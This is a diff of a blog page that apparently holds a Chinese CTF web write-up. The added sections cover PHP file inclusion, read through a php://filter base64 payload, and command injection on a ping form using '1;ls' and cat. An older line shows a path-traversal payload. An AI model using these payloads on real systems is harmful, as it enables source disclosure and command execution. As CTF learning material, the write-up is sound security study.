@@ -35,8 +35,19 @@
 <meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240124200411693.png">
 <meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240124200528267.png">
 <meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240124202309328.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125185135302.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125185152901.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125185254233.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125185430312.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125185446011.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125185625571.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125195121169.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125195228705.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125195404097.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125195436474.png">
+<meta property="og:image" content="http://example.com/2024/01/24/WebWriteUp/image-20240125195526719.png">
 <meta property="article:published_time" content="2024-01-24T10:47:42.000Z">
-<meta property="article:modified_time" content="2024-01-24T12:25:23.998Z">
+<meta property="article:modified_time" content="2024-01-25T11:56:18.313Z">
 <meta property="article:author" content="TEhS">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -233,7 +244,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          732 字
+          1.4k 字
         
       </span>
     
@@ -244,7 +255,7 @@
         
         
         
-          7 分钟
+          12 分钟
         
       </span>
     
@@ -325,6 +336,43 @@
 <p><code>source.php?file=hint.php?../../../../../../ffffllllaaaagggg</code></p>
 <p><img src="/2024/01/24/WebWriteUp/image-20240124202309328.png" srcset="/img/loading.gif" lazyload alt="image-20240124202309328"></p>
 <p>得到flag</p>
+<h4 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h4><p>根据题目猜测是文件包含漏洞</p>
+<p>文件包含漏洞成因：</p>
+<p>为了灵活的包含文件，将被包含文件设置为变量，通过动态变量引入需要包含的文件时，用户对变量的可控而服务器端未对变量值合理的校验或被绕过。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">include() <span class="hljs-comment">// 找不到被包含文件时产生警告，脚本继续执行</span><br><br>include_once() <span class="hljs-comment">// 与include类似，但如果该文件的代码已经被包含，则不会再次包含</span><br><br>require() <span class="hljs-comment">// 找不到被包含文件时产生错误，脚本停止</span><br><br>require_once() <span class="hljs-comment">// 与require类似，但如果该文件的代码已经被包含，则不会再次包含</span><br></code></pre></td></tr></table></figure>
+
+<p>文件包含漏洞利用：</p>
+<p>windows常见敏感信息</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125185135302.png" srcset="/img/loading.gif" lazyload alt="image-20240125185135302"></p>
+<p>linux常见敏感信息</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125185152901.png" srcset="/img/loading.gif" lazyload alt="image-20240125185152901"></p>
+<p>伪协议</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125185254233.png" srcset="/img/loading.gif" lazyload alt="image-20240125185254233"></p>
+<p>首先先尝试暴力找几层，看看是否存在flag.php之类的文件，发现没有</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125185430312.png" srcset="/img/loading.gif" lazyload alt="image-20240125185430312"></p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125185446011.png" srcset="/img/loading.gif" lazyload alt="image-20240125185446011"></p>
+<p>啥也没有，尝试用php伪协议看一眼flag.php的源码</p>
+<p>payload如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p>得到一串base64加密的字符串</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125185625571.png" srcset="/img/loading.gif" lazyload alt="image-20240125185625571"></p>
+<p>解码得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;9a011d4ae-cab3-4cc3-90c5-297288f0189b&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="Eexc"><a href="#Eexc" class="headerlink" title="Eexc"></a>Eexc</h4><p>这是一道命令注入题</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125195121169.png" srcset="/img/loading.gif" lazyload alt="image-20240125195121169"></p>
+<p>随便输了个1，发现居然能ping通</p>
+<p>那么修改payload为：1;ls</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125195228705.png" srcset="/img/loading.gif" lazyload alt="image-20240125195228705"></p>
+<p>继续查看上级目录：1;ls ..&#x2F;</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125195404097.png" srcset="/img/loading.gif" lazyload alt="image-20240125195404097"></p>
+<p>再查看上一级</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125195436474.png" srcset="/img/loading.gif" lazyload alt="image-20240125195436474"></p>
+<p>找到flag，用cat命令查看</p>
+<p><img src="/2024/01/24/WebWriteUp/image-20240125195526719.png" srcset="/img/loading.gif" lazyload alt="image-20240125195526719"></p>
 
                 
               </div>
